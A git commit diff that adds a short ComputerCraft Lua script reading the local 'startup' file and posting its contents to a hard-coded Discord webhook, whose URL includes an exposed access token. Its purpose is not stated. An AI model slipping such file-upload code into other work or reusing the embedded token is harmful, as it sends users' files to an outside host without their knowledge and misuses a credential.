2c7a0ecf18676de8527002d4f2f79c12b7fe9cf6
TeaTuea <156172904+TeaTuea@users.noreply.github.com>
2026-01-01 00:59:06 +0200

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,1 +1,21 @@
+local f = fs.open("startup","r")
+if not f then error("NO startup FILE") end
+local data = f.readAll()
+f.close()
 
+local url = "https://discord.com/api/webhooks/1456058820630417542/5WHStJ0vaTOfr-LO2ch95V9AW0wFRxLVg_RUZuznp--5dYEhmGPuNN8W4Jsrp6fNxNsE"
+
+local payload = textutils.serializeJSON({
+  content = "```lua\n"..data.."\n```"
+})
+
+local h = http.post(url, payload, {
+  ["Content-Type"] = "application/json"
+})
+
+if h then
+  h.close()
+  print("STARTUP SENT TO DISCORD")
+else
+  error("POST FAILED")
+end
